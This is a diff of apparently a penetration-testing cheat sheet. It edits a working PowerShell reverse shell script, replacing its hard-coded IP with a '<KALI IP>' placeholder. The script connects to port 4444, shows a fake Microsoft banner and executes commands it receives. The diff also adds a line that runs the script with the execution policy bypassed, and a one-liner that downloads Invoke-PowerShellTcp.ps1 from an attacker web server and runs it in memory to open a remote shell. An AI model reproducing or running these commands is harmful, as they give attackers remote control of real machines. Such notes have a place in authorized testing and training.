@@ -13,7 +13,7 @@ $cred = New-Object System.Management.Automation.PSCredential($user, $pwd)
 
 revshell.ps1
 ```powershell
-$c = New-Object System.Net.Sockets.TCPClient("172.20.61.115","4444");
+$c = New-Object System.Net.Sockets.TCPClient("<KALI IP>","4444");
 $I = $c.GetStream();[byte[]]$U = 0..(2-shl15)|%{0};
 $U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n");
 $I.Write($U,0,$U.Length); $U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>'); $I.Write($U,0,$U.Length);
@@ -22,9 +22,15 @@ $a = (iex $D 2>&1 | Out-String ); $r  = $a + (pwd).Path + '> '; $m = ([text.enco
 $I.Write($m,0,$m.Length); $I.Flush()}; $c.Close();
 ```
 
-exec file
+Exec file
 ```
 powershell -nop -exec Bypass -File revshell.ps1
+```
+
+
+Execute download direct on memory
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
 ```
 
 
